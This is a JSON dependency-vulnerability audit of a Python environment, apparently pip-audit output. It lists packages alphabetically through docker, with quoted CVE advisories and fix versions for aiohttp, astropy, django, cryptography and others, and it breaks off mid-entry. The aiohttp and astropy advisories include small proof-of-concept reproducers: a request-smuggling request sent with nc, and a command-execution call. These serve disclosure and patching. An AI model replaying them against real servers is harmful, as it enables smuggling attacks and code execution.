{"dependencies": [{"name": "absl-py", "version": "1.4.0", "vulns": []}, {"name": "abstract-singleton", "version": "1.0.1", "vulns": []}, {"name": "accelerate", "version": "1.7.0", "vulns": []}, {"name": "agbenchmark", "version": "0.0.2", "vulns": []}, {"name": "agent-protocol", "skip_reason": "Dependency not found on PyPI and could not be audited: agent-protocol (0.3.0)"}, {"name": "aiobotocore", "version": "2.5.0", "vulns": []}, {"name": "aiofiles", "version": "23.2.1", "vulns": []}, {"name": "aiohttp", "version": "3.8.4", "vulns": [{"id": "PYSEC-2024-24", "fix_versions": ["3.9.2"], "aliases": ["GHSA-5h86-8mv2-jq9f", "CVE-2024-23334"], "description": "aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check if reading a file is within the root directory. This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.  Disabling follow_symlinks and using a reverse proxy are encouraged mitigations.  Version 3.9.2 fixes this issue."}, {"id": "PYSEC-2023-120", "fix_versions": ["3.8.5"], "aliases": ["GHSA-45c4-8wx5-qw6w", "CVE-2023-37276"], "description": "### Impact  aiohttp v3.8.4 and earlier are [bundled with llhttp v6.0.6](https://github.com/aio-libs/aiohttp/blob/v3.8.4/.gitmodules) which is vulnerable to CVE-2023-30589. The vulnerable code is used by aiohttp for its HTTP request parser when available which is the default case when installing from a wheel.  This vulnerability only affects users of aiohttp as an HTTP server (ie `aiohttp.Application`), you are not affected by this vulnerability if you are using aiohttp as an HTTP client library (ie `aiohttp.ClientSession`).  ### Reproducer  ```python from aiohttp import web  async def example(request: web.Request):     headers = dict(request.headers)     body = await request.content.read()     return web.Response(text=f\"headers: {headers} body: {body}\")  app = web.Application() app.add_routes([web.post('/', example)]) web.run_app(app) ```  Sending a crafted HTTP request will cause the server to misinterpret one of the HTTP header values leading to HTTP request smuggling.  ```console $ printf \"POST / HTTP/1.1\\r\\nHost: localhost:8080\\r\\nX-Abc: \\rxTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nA\\r\\n0\\r\\n\\r\\n\" \\   | nc localhost 8080  Expected output:   headers: {'Host': 'localhost:8080', 'X-Abc': '\\rxTransfer-Encoding: chunked'} body: b''  Actual output (note that 'Transfer-Encoding: chunked' is an HTTP header now and body is treated differently)   headers: {'Host': 'localhost:8080', 'X-Abc': '', 'Transfer-Encoding': 'chunked'} body: b'A' ```  ### Patches  Upgrade to the latest version of aiohttp to resolve this vulnerability. It has been fixed in v3.8.5: [`pip install aiohttp >= 3.8.5`](https://pypi.org/project/aiohttp/3.8.5/)  ### Workarounds  If you aren't able to upgrade you can reinstall aiohttp using `AIOHTTP_NO_EXTENSIONS=1` as an environment variable to disable the llhttp HTTP request parser implementation. The pure Python implementation isn't vulnerable to request smuggling:  ```console $ python -m pip uninstall --yes aiohttp $ AIOHTTP_NO_EXTENSIONS=1 python -m pip install --no-binary=aiohttp --no-cache aiohttp ```  ### References  * https://nvd.nist.gov/vuln/detail/CVE-2023-30589 * https://hackerone.com/reports/2001873 "}, {"id": "PYSEC-2023-250", "fix_versions": ["3.9.0"], "aliases": ["GHSA-q3qx-c6g2-7pw2", "CVE-2023-49081"], "description": "aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. Improper validation made it possible for an attacker to modify the HTTP request (e.g. to insert a new header) or create a new HTTP request if the attacker controls the HTTP version. The vulnerability only occurs if the attacker can control the HTTP version of the request. This issue has been patched in version 3.9.0."}, {"id": "PYSEC-2023-251", "fix_versions": ["3.9.0"], "aliases": ["GHSA-qvrw-v9rv-5rjx", "CVE-2023-49082"], "description": "aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. Improper validation makes it possible for an attacker to modify the HTTP request (e.g. insert a new header) or even create a new HTTP request if the attacker controls the HTTP method. The vulnerability occurs only if the attacker can control the HTTP method (GET, POST etc.) of the request. If the attacker can control the HTTP version of the request it will be able to modify the request (request smuggling). This issue has been patched in version 3.9.0."}, {"id": "PYSEC-2023-246", "fix_versions": ["3.8.6"], "aliases": ["GHSA-gfw2-4jvh-wgfg", "CVE-2023-47627"], "description": "aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. The HTTP parser in AIOHTTP has numerous problems with header parsing, which could lead to request smuggling. This parser is only used when AIOHTTP_NO_EXTENSIONS is enabled (or not using a prebuilt wheel). These bugs have been addressed in commit `d5c12ba89` which has been included in release version 3.8.6. Users are advised to upgrade. There are no known workarounds for these issues."}, {"id": "PYSEC-2024-26", "fix_versions": ["3.9.2"], "aliases": ["GHSA-8qpw-xqxj-h4r2", "CVE-2024-23829"], "description": "aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. Security-sensitive parts of the Python HTTP parser retained minor differences in allowable character sets, that must trigger error handling to robustly match frame boundaries of proxies in order to protect against injection of additional requests. Additionally, validation could trigger exceptions that were not handled consistently with processing of other malformed input.  Being more lenient than internet standards require could, depending on deployment environment, assist in request smuggling. The unhandled exception could cause excessive resource consumption on the application server and/or its logging facilities. This vulnerability exists due to an incomplete fix for CVE-2023-47627. Version 3.9.2 fixes this vulnerability."}, {"id": "GHSA-pjjw-qhg8-p2p9", "fix_versions": ["3.8.6"], "aliases": [], "description": "### Summary llhttp 8.1.1 is vulnerable to two request smuggling vulnerabilities. Details have not been disclosed yet, so refer to llhttp for future information. The issue is resolved by using llhttp 9+ (which is included in aiohttp 3.8.6+)."}, {"id": "GHSA-7gpw-8wmc-pm8g", "fix_versions": ["3.9.4"], "aliases": ["CVE-2024-27306"], "description": "### Summary  A XSS vulnerability exists on index pages for static file handling.  ### Details  When using `web.static(..., show_index=True)`, the resulting index pages do not escape file names.  If users can upload files with arbitrary filenames to the static directory, the server is vulnerable to XSS attacks.  ### Workaround  We have always recommended using a reverse proxy server (e.g. nginx) for serving static files. Users following the recommendation are unaffected.  Other users can disable `show_index` if unable to upgrade.  -----  Patch: https://github.com/aio-libs/aiohttp/pull/8319/files"}, {"id": "GHSA-5m98-qgg9-wh84", "fix_versions": ["3.9.4"], "aliases": ["CVE-2024-30251"], "description": "### Summary An attacker can send a specially crafted POST (multipart/form-data) request. When the aiohttp server processes it, the server will enter an infinite loop and be unable to process any further requests.  ### Impact An attacker can stop the application from serving requests after sending a single request.  -------  For anyone needing to patch older versions of aiohttp, the minimum diff needed to resolve the issue is (located in `_read_chunk_from_length()`):  ```diff diff --git a/aiohttp/multipart.py b/aiohttp/multipart.py index 227be605c..71fc2654a 100644 --- a/aiohttp/multipart.py +++ b/aiohttp/multipart.py @@ -338,6 +338,8 @@ class BodyPartReader:          assert self._length is not None, \"Content-Length required for chunked read\"          chunk_size = min(size, self._length - self._read_bytes)          chunk = await self._content.read(chunk_size) +        if self._content.at_eof(): +            self._at_eof = True          return chunk        async def _read_chunk_from_stream(self, size: int) -> bytes: ```  This does however introduce some very minor issues with handling form data. So, if possible, it would be recommended to also backport the changes in: https://github.com/aio-libs/aiohttp/commit/cebe526b9c34dc3a3da9140409db63014bc4cf19 https://github.com/aio-libs/aiohttp/commit/7eecdff163ccf029fbb1ddc9de4169d4aaeb6597 https://github.com/aio-libs/aiohttp/commit/f21c6f2ca512a026ce7f0f6c6311f62d6a638866"}, {"id": "GHSA-8495-4g3g-x7pr", "fix_versions": ["3.10.11"], "aliases": ["CVE-2024-52304"], "description": "### Summary The Python parser parses newlines in chunk extensions incorrectly which can lead to request smuggling vulnerabilities under certain conditions.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or `AIOHTTP_NO_EXTENSIONS` is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/259edc369075de63e6f3a4eaade058c62af0df71"}]}, {"name": "aioitertools", "version": "0.7.1", "vulns": []}, {"name": "aiosignal", "version": "1.2.0", "vulns": []}, {"name": "aiosqlite", "version": "0.18.0", "vulns": []}, {"name": "alabaster", "version": "1.0.0", "vulns": []}, {"name": "altair", "version": "5.5.0", "vulns": []}, {"name": "anaconda-catalogs", "version": "0.2.0", "vulns": []}, {"name": "anaconda-client", "skip_reason": "Dependency not found on PyPI and could not be audited: anaconda-client (1.12.0)"}, {"name": "anaconda-navigator", "skip_reason": "Dependency not found on PyPI and could not be audited: anaconda-navigator (2.4.2)"}, {"name": "anaconda-project", "skip_reason": "Dependency not found on PyPI and could not be audited: anaconda-project (0.11.1)"}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anthropic", "version": "0.40.0", "vulns": []}, {"name": "anyio", "version": "4.9.0", "vulns": []}, {"name": "appdirs", "version": "1.4.4", "vulns": []}, {"name": "appium-python-client", "version": "4.4.0", "vulns": []}, {"name": "applaunchservices", "version": "0.3.0", "vulns": []}, {"name": "appnope", "version": "0.1.2", "vulns": []}, {"name": "appscript", "version": "1.1.2", "vulns": []}, {"name": "argon2-cffi", "version": "21.3.0", "vulns": []}, {"name": "argon2-cffi-bindings", "version": "21.2.0", "vulns": []}, {"name": "arrow", "version": "1.2.3", "vulns": []}, {"name": "asgiref", "version": "3.7.2", "vulns": []}, {"name": "astroid", "version": "2.14.2", "vulns": []}, {"name": "astropy", "version": "5.1", "vulns": [{"id": "GHSA-h2x6-5jx5-46hf", "fix_versions": ["5.3.3"], "aliases": ["CVE-2023-41334"], "description": "### Summary RCE due to improper input validation in TranformGraph().to_dot_graph function  ### Details  Due to improper input validation a malicious user can provide a command or a script file as a value to `savelayout` argument, which will be placed as the first value in a list of arguments passed to `subprocess.Popen`.  https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539 Although an error will be raised, the command or script will be executed successfully.  ### PoC  ```shell $ cat /tmp/script #!/bin/bash echo astrorce > /tmp/poc.txt ``` ```shell $ python3 Python 3.9.2 (default, Feb 28 2021, 17:03:44)  [GCC 10.2.1 20210110] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> from astropy.coordinates.transformations import TransformGraph >>> tg = TransformGraph() >>> tg.to_dot_graph(savefn=\"/tmp/1.txt\", savelayout=\"/tmp/script\") Traceback (most recent call last):   File \"<stdin>\", line 1, in <module>   File \"/home/u32i/.local/lib/python3.9/site-packages/astropy/coordinates/transformations.py\", line 584, in to_dot_graph     stdout, stderr = proc.communicate(dotgraph)   File \"/usr/lib/python3.9/subprocess.py\", line 1134, in communicate     stdout, stderr = self._communicate(input, endtime, timeout)   File \"/usr/lib/python3.9/subprocess.py\", line 1961, in _communicate     input_view = memoryview(self._input) TypeError: memoryview: a bytes-like object is required, not 'str' >>>  ``` ```shell $ cat /tmp/poc.txt astrorce ```  ### Impact code execution on the user's machine "}]}, {"name": "asttokens", "version": "2.0.5", "vulns": []}, {"name": "astunparse", "version": "1.6.3", "vulns": []}, {"name": "async-generator", "version": "1.10", "vulns": []}, {"name": "async-timeout", "version": "4.0.2", "vulns": []}, {"name": "asyncpg", "version": "0.30.0", "vulns": []}, {"name": "asynctest", "version": "0.13.0", "vulns": []}, {"name": "atomicwrites", "version": "1.4.0", "vulns": []}, {"name": "attr", "version": "0.3.2", "vulns": []}, {"name": "attrs", "version": "24.2.0", "vulns": []}, {"name": "authlib", "version": "1.6.0", "vulns": []}, {"name": "auto-cursor", "skip_reason": "Dependency not found on PyPI and could not be audited: auto-cursor (0.1.0)"}, {"name": "auto-gpt-plugin-template", "version": "0.0.2", "vulns": []}, {"name": "autoflake", "version": "2.2.1", "vulns": []}, {"name": "automat", "version": "20.2.0", "vulns": []}, {"name": "automation", "version": "0.1.0", "vulns": []}, {"name": "autopep8", "version": "1.6.0", "vulns": []}, {"name": "babel", "version": "2.16.0", "vulns": []}, {"name": "backcall", "version": "0.2.0", "vulns": []}, {"name": "backoff", "version": "2.2.1", "vulns": []}, {"name": "backports-functools-lru-cache", "version": "1.6.4", "vulns": []}, {"name": "backports-tempfile", "version": "1.0", "vulns": []}, {"name": "backports-weakref", "version": "1.0.post1", "vulns": []}, {"name": "bandit", "version": "1.8.5", "vulns": []}, {"name": "bcrypt", "version": "4.0.1", "vulns": []}, {"name": "beautifulsoup4", "version": "4.12.2", "vulns": []}, {"name": "bidict", "version": "0.23.1", "vulns": []}, {"name": "binaryornot", "version": "0.4.4", "vulns": []}, {"name": "black", "version": "23.11.0", "vulns": [{"id": "PYSEC-2024-48", "fix_versions": ["24.3.0"], "aliases": ["CVE-2024-21503"], "description": "Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.\r\rExploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings."}]}, {"name": "bleach", "version": "4.1.0", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "blis", "version": "0.7.10", "vulns": []}, {"name": "blosc2", "version": "2.0.0", "vulns": []}, {"name": "bokeh", "version": "3.2.1", "vulns": []}, {"name": "boltons", "version": "21.0.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "botocore", "version": "1.29.76", "vulns": []}, {"name": "bottleneck", "version": "1.3.5", "vulns": []}, {"name": "bracex", "version": "2.6", "vulns": []}, {"name": "brotli", "version": "1.1.0", "vulns": []}, {"name": "brotlipy", "version": "0.7.0", "vulns": []}, {"name": "build", "version": "1.0.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.3", "vulns": []}, {"name": "cachetools", "version": "4.2.4", "vulns": []}, {"name": "camel-converter", "version": "3.0.2", "vulns": []}, {"name": "catalogue", "version": "2.0.9", "vulns": []}, {"name": "certifi", "version": "2023.7.22", "vulns": [{"id": "PYSEC-2024-230", "fix_versions": ["2024.7.4"], "aliases": ["CVE-2024-39689"], "description": "Certifi is a curated collection of Root Certificates for validating the trustworthiness of SSL certificates while verifying the identity of TLS hosts. Certifi starting in 2021.05.30 and prior to 2024.07.4 recognized root certificates from `GLOBALTRUST`. Certifi 2024.07.04 removes root certificates from `GLOBALTRUST` from the root store. These are in the process of being removed from Mozilla's trust store. `GLOBALTRUST`'s root certificates are being removed pursuant to an investigation which identified \"long-running and unresolved compliance issues.\""}]}, {"name": "cffi", "version": "1.15.1", "vulns": []}, {"name": "cfgv", "version": "3.4.0", "vulns": []}, {"name": "channels", "version": "4.0.0", "vulns": []}, {"name": "chardet", "version": "4.0.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.3.2", "vulns": []}, {"name": "chroma-hnswlib", "version": "0.7.2", "vulns": []}, {"name": "chromadb", "version": "0.4.8", "vulns": []}, {"name": "click", "version": "8.1.8", "vulns": []}, {"name": "click-option-group", "version": "0.5.7", "vulns": []}, {"name": "cloudpickle", "version": "2.2.1", "vulns": []}, {"name": "clyent", "skip_reason": "Dependency not found on PyPI and could not be audited: clyent (1.2.2)"}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "colorcet", "version": "3.0.1", "vulns": []}, {"name": "coloredlogs", "version": "15.0.1", "vulns": []}, {"name": "colorlog", "version": "6.9.0", "vulns": []}, {"name": "comm", "version": "0.1.2", "vulns": []}, {"name": "conda", "skip_reason": "Dependency not found on PyPI and could not be audited: conda (23.7.3)"}, {"name": "conda-build", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-build (3.26.1)"}, {"name": "conda-content-trust", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-content-trust (0.2.0)"}, {"name": "conda-index", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-index (0.2.3)"}, {"name": "conda-libmamba-solver", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-libmamba-solver (23.7.0)"}, {"name": "conda-pack", "version": "0.6.0", "vulns": []}, {"name": "conda-package-handling", "version": "2.2.0", "vulns": []}, {"name": "conda-package-streaming", "version": "0.9.0", "vulns": []}, {"name": "conda-repo-cli", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-repo-cli (1.0.41)"}, {"name": "conda-token", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-token (0.4.0)"}, {"name": "conda-verify", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-verify (3.4.2)"}, {"name": "confection", "version": "0.1.3", "vulns": []}, {"name": "configargparse", "version": "1.7.1", "vulns": []}, {"name": "constantly", "version": "15.1.0", "vulns": []}, {"name": "contourpy", "version": "1.0.5", "vulns": []}, {"name": "cookiecutter", "version": "1.7.3", "vulns": [{"id": "PYSEC-2022-204", "fix_versions": ["2.1.1"], "aliases": ["SNYK-PYTHON-COOKIECUTTER-2414281", "CVE-2022-24065", "GHSA-f4q6-9qm4-h8j4"], "description": "The package cookiecutter before 2.1.1 are vulnerable to Command Injection via hg argument injection. When calling the cookiecutter function from Python code with the checkout parameter, it is passed to the hg checkout command in a way that additional flags can be set. The additional flags can be used to perform a command injection."}]}, {"name": "courlan", "version": "0.9.4", "vulns": []}, {"name": "coverage", "version": "7.9.1", "vulns": []}, {"name": "coverage-badge", "version": "1.1.2", "vulns": []}, {"name": "cryptography", "version": "41.0.2", "vulns": [{"id": "PYSEC-2023-254", "fix_versions": ["41.0.6"], "aliases": ["GHSA-jfhm-5ghh-2f97", "CVE-2023-49083"], "description": "cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. Calling `load_pem_pkcs7_certificates` or `load_der_pkcs7_certificates` could lead to a NULL-pointer dereference and segfault. Exploitation of this vulnerability poses a serious risk of Denial of Service (DoS) for any application attempting to deserialize a PKCS7 blob/certificate. The consequences extend to potential disruptions in system availability and stability. This vulnerability has been patched in version 41.0.6."}, {"id": "PYSEC-2024-225", "fix_versions": ["42.0.4"], "aliases": ["CVE-2024-26130"], "description": "cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. Starting in version 38.0.0 and prior to version 42.0.4, if `pkcs12.serialize_key_and_certificates` is called with both a certificate whose public key did not match the provided private key and an `encryption_algorithm` with `hmac_hash` set (via `PrivateFormat.PKCS12.encryption_builder().hmac_hash(...)`, then a NULL pointer dereference would occur, crashing the Python process. This has been resolved in version 42.0.4, the first version in which a `ValueError` is properly raised."}, {"id": "GHSA-jm77-qphf-c4w8", "fix_versions": ["41.0.3"], "aliases": [], "description": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.  If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions."}, {"id": "GHSA-3ww4-gg4f-jr7f", "fix_versions": ["42.0.0"], "aliases": ["CVE-2023-50782"], "description": "A flaw was found in the python-cryptography package. This issue may allow a remote attacker to decrypt captured messages in TLS servers that use RSA key exchanges, which may lead to exposure of confidential or sensitive data."}, {"id": "GHSA-v8gr-m533-ghj9", "fix_versions": ["41.0.4"], "aliases": [], "description": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.  If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions."}, {"id": "GHSA-9v9h-cgj8-h64p", "fix_versions": ["42.0.2"], "aliases": ["CVE-2024-0727"], "description": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL to crash leading to a potential Denial of Service attack  Impact summary: Applications loading files in the PKCS12 format from untrusted sources might terminate abruptly.  A file in PKCS12 format can contain certificates and keys and may come from an untrusted source. The PKCS12 specification allows certain fields to be NULL, but OpenSSL does not correctly check for this case. This can lead to a NULL pointer dereference that results in OpenSSL crashing. If an application processes PKCS12 files from an untrusted source using the OpenSSL APIs then that application will be vulnerable to this issue.  OpenSSL APIs that are vulnerable to this are: PKCS12_parse(), PKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes() and PKCS12_newpass().  We have also fixed a similar issue in SMIME_write_PKCS7(). However since this function is related to writing data we do not consider it security significant.  The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue."}, {"id": "GHSA-h4gh-qq45-vh27", "fix_versions": ["43.0.1"], "aliases": [], "description": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 37.0.0-43.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20240903.txt.  If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions. "}]}, {"name": "cssselect", "version": "1.1.0", "vulns": []}, {"name": "cssutils", "version": "2.11.1", "vulns": []}, {"name": "customtkinter", "version": "5.2.2", "vulns": []}, {"name": "cycler", "version": "0.11.0", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "9.1.0", "vulns": []}, {"name": "cymem", "version": "2.0.7", "vulns": []}, {"name": "cython", "version": "3.0.2", "vulns": []}, {"name": "cytoolz", "version": "0.12.0", "vulns": []}, {"name": "darkdetect", "version": "0.8.0", "vulns": []}, {"name": "dask", "version": "2023.6.0", "vulns": []}, {"name": "dataclasses-json", "version": "0.5.7", "vulns": []}, {"name": "datasets", "version": "2.12.0", "vulns": []}, {"name": "datashader", "version": "0.15.2", "vulns": []}, {"name": "datashape", "skip_reason": "Dependency not found on PyPI and could not be audited: datashape (0.5.4)"}, {"name": "dateparser", "version": "1.1.8", "vulns": []}, {"name": "debugpy", "version": "1.6.7", "vulns": []}, {"name": "decorator", "version": "5.1.1", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "deprecated", "version": "1.2.18", "vulns": []}, {"name": "diff-match-patch", "version": "20200713", "vulns": []}, {"name": "dill", "version": "0.3.6", "vulns": []}, {"name": "distlib", "version": "0.3.7", "vulns": []}, {"name": "distributed", "version": "2023.6.0", "vulns": []}, {"name": "distro", "version": "1.8.0", "vulns": []}, {"name": "django", "version": "4.2.5", "vulns": [{"id": "PYSEC-2023-222", "fix_versions": ["3.2.23", "4.1.13", "4.2.7"], "aliases": ["CVE-2023-46695"], "description": "An issue was discovered in Django 3.2 before 3.2.23, 4.1 before 4.1.13, and 4.2 before 4.2.7. The NFKC normalization is slow on Windows. As a consequence, django.contrib.auth.forms.UsernameField is subject to a potential DoS (denial of service) attack via certain inputs with a very large number of Unicode characters."}, {"id": "PYSEC-2023-226", "fix_versions": ["3.2.22", "4.1.12", "4.2.6"], "aliases": ["CVE-2023-43665"], "description": "In Django 3.2 before 3.2.22, 4.1 before 4.1.12, and 4.2 before 4.2.6, the django.utils.text.Truncator chars() and words() methods (when used with html=True) are subject to a potential DoS (denial of service) attack via certain inputs with very long, potentially malformed HTML text. The chars() and words() methods are used to implement the truncatechars_html and truncatewords_html template filters, which are thus also vulnerable. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232."}, {"id": "PYSEC-2024-28", "fix_versions": ["3.2.24", "4.2.10", "5.0.2"], "aliases": ["CVE-2024-24680"], "description": "An issue was discovered in Django 3.2 before 3.2.24, 4.2 before 4.2.10, and Django 5.0 before 5.0.2. The intcomma template filter was subject to a potential denial-of-service attack when used with very long strings."}, {"id": "PYSEC-2024-47", "fix_versions": ["3.2.25", "4.2.11", "5.0.3"], "aliases": ["CVE-2024-27351"], "description": "In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665."}, {"id": "PYSEC-2024-58", "fix_versions": ["4.2.14", "5.0.7"], "aliases": ["CVE-2024-39330"], "description": "An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. Derived classes of the django.core.files.storage.Storage base class, when they override generate_filename() without replicating the file-path validations from the parent class, potentially allow directory traversal via certain inputs during a save() call. (Built-in Storage sub-classes are unaffected.)"}, {"id": "PYSEC-2024-57", "fix_versions": ["4.2.14", "5.0.7"], "aliases": ["CVE-2024-39329"], "description": "An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. The django.contrib.auth.backends.ModelBackend.authenticate() method allows remote attackers to enumerate users via a timing attack involving login requests for users with an unusable password."}, {"id": "PYSEC-2024-56", "fix_versions": ["4.2.14", "5.0.7"], "aliases": ["CVE-2024-38875"], "description": "An issue was discovered in Django 4.2 before 4.2.14 and 5.0 before 5.0.7. urlize and urlizetrunc were subject to a potential denial of service attack via certain inputs with a very large number of brackets."}, {"id": "PYSEC-2024-59", "fix_versions": ["4.2.14", "5.0.7"], "aliases": ["CVE-2024-39614"], "description": "An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. get_supported_language_variant() was subject to a potential denial-of-service attack when used with very long strings containing specific characters."}, {"id": "PYSEC-2024-69", "fix_versions": ["4.2.15", "5.0.8"], "aliases": ["CVE-2024-41991"], "description": "An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize and urlizetrunc template filters, and the AdminURLFieldWidget widget, are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters."}, {"id": "PYSEC-2024-70", "fix_versions": ["4.2.15", "5.0.8"], "aliases": ["CVE-2024-42005"], "description": "An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. QuerySet.values() and values_list() methods on models with a JSONField are subject to SQL injection in column aliases via a crafted JSON object key as a passed *arg."}, {"id": "PYSEC-2024-68", "fix_versions": ["4.2.15", "5.0.8"], "aliases": ["CVE-2024-41990"], "description": "An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize() and urlizetrunc() template filters are subject to a potential denial-of-service attack via very large inputs with a specific sequence of characters."}, {"id": "PYSEC-2024-67", "fix_versions": ["4.2.15", "5.0.8"], "aliases": ["CVE-2024-41989"], "description": "An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The floatformat template filter is subject to significant memory consumption when given a string representation of a number in scientific notation with a large exponent."}, {"id": "PYSEC-2025-13", "fix_versions": ["4.2.20", "5.0.13", "5.1.7"], "aliases": ["CVE-2025-26699"], "description": "An issue was discovered in Django 5.1 before 5.1.7, 5.0 before 5.0.13, and 4.2 before 4.2.20. The django.utils.text.wrap() method and wordwrap template filter are subject to a potential denial-of-service attack when used with very long strings."}, {"id": "PYSEC-2024-102", "fix_versions": ["4.2.16", "5.0.9", "5.1.1"], "aliases": ["CVE-2024-45230"], "description": "An issue was discovered in Django 5.1 before 5.1.1, 5.0 before 5.0.9, and 4.2 before 4.2.16. The urlize() and urlizetrunc() template filters are subject to a potential denial-of-service attack via very large inputs with a specific sequence of characters."}, {"id": "PYSEC-2025-37", "fix_versions": ["4.2.21", "5.1.9", "5.2.1"], "aliases": ["CVE-2025-32873"], "description": "An issue was discovered in Django 4.2 before 4.2.21, 5.1 before 5.1.9, and 5.2 before 5.2.1. The django.utils.html.strip_tags() function is vulnerable to a potential denial-of-service (slow performance) when processing inputs containing large sequences of incomplete HTML tags. The template filter striptags is also vulnerable, because it is built on top of strip_tags()."}, {"id": "PYSEC-2024-157", "fix_versions": ["4.2.17", "5.0.10", "5.1.4"], "aliases": ["CVE-2024-53908"], "description": "An issue was discovered in Django 5.1 before 5.1.4, 5.0 before 5.0.10, and 4.2 before 4.2.17. Direct usage of the django.db.models.fields.json.HasKey lookup, when an Oracle database is used, is subject to SQL injection if untrusted data is used as an lhs value. (Applications that use the jsonfield.has_key lookup via __ are unaffected.)"}, {"id": "PYSEC-2024-156", "fix_versions": ["4.2.17", "5.0.10", "5.1.4"], "aliases": ["CVE-2024-53907"], "description": "An issue was discovered in Django 5.1 before 5.1.4, 5.0 before 5.0.10, and 4.2 before 4.2.17. The strip_tags() method and striptags template filter are subject to a potential denial-of-service attack via certain inputs containing large sequences of nested incomplete HTML entities."}, {"id": "PYSEC-2025-1", "fix_versions": ["4.2.18", "5.0.11", "5.1.5"], "aliases": ["CVE-2024-56374"], "description": "An issue was discovered in Django 5.1 before 5.1.5, 5.0 before 5.0.11, and 4.2 before 4.2.18. Lack of upper-bound limit enforcement in strings passed when performing IPv6 validation could lead to a potential denial-of-service attack. The undocumented and private functions clean_ipv6_address and is_valid_ipv6_address are vulnerable, as is the django.forms.GenericIPAddressField form field. (The django.db.models.GenericIPAddressField model field is not affected.)"}, {"id": "PYSEC-2025-47", "fix_versions": ["4.2.22", "5.1.10", "5.2.2"], "aliases": ["CVE-2025-48432"], "description": "An issue was discovered in Django 5.2 before 5.2.2, 5.1 before 5.1.10, and 4.2 before 4.2.22. Internal HTTP response logging does not escape request.path, which allows remote attackers to potentially manipulate log output via crafted URLs. This may lead to log injection or forgery when logs are viewed in terminals or processed by external systems."}, {"id": "GHSA-rrqc-c2jx-6jgv", "fix_versions": ["4.2.16", "5.0.9", "5.1.1"], "aliases": ["CVE-2024-45231"], "description": "An issue was discovered in Django v5.1.1, v5.0.9, and v4.2.16. The django.contrib.auth.forms.PasswordResetForm class, when used in a view implementing password reset flows, allows remote attackers to enumerate user e-mail addresses by sending password reset requests and observing the outcome (only when e-mail sending is consistently failing)."}]}, {"name": "dnspython", "version": "2.4.2", "vulns": []}, {"name": "docker", "version": "6.1.3", "vulns": []}, {"name": "docker-pycreds", "version": 